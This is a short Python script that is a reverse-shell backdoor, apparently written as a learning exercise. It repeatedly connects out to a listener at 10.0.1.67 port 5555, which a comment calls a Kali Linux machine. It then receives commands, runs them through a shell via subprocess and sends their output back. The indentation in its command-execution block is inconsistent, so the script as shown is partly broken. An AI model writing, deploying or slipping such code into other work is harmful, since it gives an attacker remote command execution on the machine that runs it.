import socket
import time
import json
import subprocess

def reliable_send(data):
	jsondata = json.dumps(data)
	sock.send(jsondata.encode())

def reliable_recieve():
	data = ''
	while True:
		try:
				data = data + sock.recv(1024).decode().rstrip()
				return json.loads(data)
		except ValueError:
			continue




def connection ():
		while True:
			time.sleep(20)
			try:
				sock.connect(('10.0.1.67',5555)) #will try to connect to kali linux machine
				shell() # shell function needs to be coded to execute commands
				sock.close() #close socket object
				break
			except:
					connection()


def shell():
		while True:
			command = reliable_recieve()
			if command == 'quit':
				break  # this will exit out the program once you use quit.
			else:
                execute = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()